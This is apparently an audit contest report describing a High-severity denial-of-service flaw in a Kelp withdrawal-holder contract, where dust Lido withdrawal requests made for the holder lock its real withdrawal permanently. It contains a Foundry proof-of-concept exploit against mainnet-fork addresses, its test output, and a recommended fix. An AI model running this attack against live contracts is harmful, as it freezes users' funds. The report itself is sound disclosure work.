Icy Cedar Nightingale

High

# `Kelp:_finalizeCooldown` cannot claim the withdrawal if adversary would requestWithdrawals with dust amount for the holder

## Summary

If an adversary calls `LidoWithdraw.requestWithdrawals` with some dust stETH amount and the `KelpCooldownHolder`'s address, the withdrawal will be locked. It cannot be rescued via `rescueTokens`, since it does not have to logic to `claimWithdrawal`, therefore the withdrawal will be locked permanently.

## Vulnerability Detail

The `KelpCooldownHolder` is responsible to withdraw from rsETH to stETH via `WithdraManager`, and then withdraw stETH to ETH via `LidoWithdraw`. Since it is two step process, the `KelpCooldownHolder` implements `triggerExtraStep`. After the first withdrawal request is finalized, the `triggerExtraStep` should be called to initiate the second withdrawal request.
https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L83

The `KelpCooldownHolder._finalizeCooldown` will be called when the `exitVault` is called to finalize the process by `LidoWithdraw.claimWithdrawal` and send the claimed ETH back to the vault.

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L100

This `KelpCooldownHolder._finalizeCooldown` is, however, hardcoded to claim the 0-th request from the `LidoWithdraw.getWithdrawalRequests`, thus  if there are more than 1 withdrawal requests for this `KelpCooldownHolder`, all the requests but the 0-th request will be ignored.

An adversary can abuse this fact by request withdrawal for the `KelpCooldownHolder` before the `triggerExtraStep` is called. In that case the real withdrawal request will not be the 0-th, and will be ignored. 

After the finalize on the dust withdrawal is done, the accountWithdrawRequest on the PendlePTKelpVault will be deleted and this `finalizeCooldown` on the holder cannot be called again since it has onlyVault modifier. The `rescueTokens` will not help, as the stETH is already transferred to LidoWithdraw.


### PoC

Here is a proof of concept demonstrating that a third party can call `LidoWithdrawals.requestWithdrawals`. And the requestId is in the order of request:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

import {IERC20} from "@interfaces/IERC20.sol";

interface ILidoWithdraw {
    struct WithdrawalRequestStatus {
        uint256 amountOfStETH;
        uint256 amountOfShares;
        address owner;
        uint256 timestamp;
        bool isFinalized;
        bool isClaimed;
    }

    function requestWithdrawals(uint256[] memory _amounts, address _owner) external returns (uint256[] memory requestIds);
    function getWithdrawalRequests(address _owner) external view returns (uint256[] memory requestsIds);
    function getWithdrawalStatus(uint256[] memory _requestIds) external view returns (WithdrawalRequestStatus[] memory statuses);
}

IERC20 constant rsETH = IERC20(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7);
address constant stETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
ILidoWithdraw constant LidoWithdraw = ILidoWithdraw(0x889edC2eDab5f40e902b864aD4d7AdE8E412F9B1);


contract KelpTestLido is Test {
    address stETHWhale;
    uint tokensClaimed;

    function setUp() public {
        stETHWhale = 0x804a7934bD8Cd166D35D8Fb5A1eb1035C8ee05ce;
        tokensClaimed = 10e18;
        vm.startPrank(stETHWhale);
        IERC20(stETH).transfer(address(this), tokensClaimed);
        vm.stopPrank();
    }

    function test_Lido_requestId() public {
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100;
        // Adversary calls requestWithdrawals for the holder with dust amount
        vm.startPrank(stETHWhale);
        IERC20(stETH).approve(address(LidoWithdraw), amounts[0]);
        LidoWithdraw.requestWithdrawals(amounts, address(this));
        vm.stopPrank();

        // The real withdrawal request is done after
        amounts[0] = tokensClaimed;
        IERC20(stETH).approve(address(LidoWithdraw), amounts[0]);
        uint256[] memory requestIds = LidoWithdraw.requestWithdrawals(amounts, address(this));
        uint real_requestId = requestIds[0];
        for(uint i=0; i< requestIds.length; i++) {
          emit log_named_uint("request id for real withdrawal request", requestIds[i]);
        }

        requestIds = LidoWithdraw.getWithdrawalRequests(address(this));
        for(uint i=0; i< requestIds.length; i++) {
          console.log("id for %s: %s",i, requestIds[i]);
        }

        ILidoWithdraw.WithdrawalRequestStatus[] memory withdrawsStatus = LidoWithdraw.getWithdrawalStatus(requestIds);
        for(uint i=0; i< requestIds.length; i++) {
          console.log("stETH amount for %s: %s",i, withdrawsStatus[i].amountOfStETH);
        }

        require(real_requestId != requestIds[0]);
    }
}
```

The Result is below: note that the 0-th request only has the dust amount of stETH request (100)

```sh
[PASS] test_Lido_requestId() (gas: 370501)
Logs:
  request id for real withdrawal request: 44537
  id for 0: 44536
  id for 1: 44537
  stETH amount for 0: 100
  stETH amount for 1: 10000000000000000000
```

The addresses are taken from the mainnet, so should fork from the mainnet to test.

## Impact

A malicious actor can use dust amount of stETH to freeze withdrawal from the `KelpPTKelpVault`. The frozen withdrawal will be locked permanently,

## Code Snippet

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L83

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L100

## Tool used

Manual Review

## Recommendation

Consider claiming all the withdrawals from LidoWithdraw. However, an adversary can request withdrawals for the holder multiple times with dust stETH, attempting another DoS factor. Alternatively consider storing the requestId in the triggerExtraStep, and claim only the stored request in the finalize step.

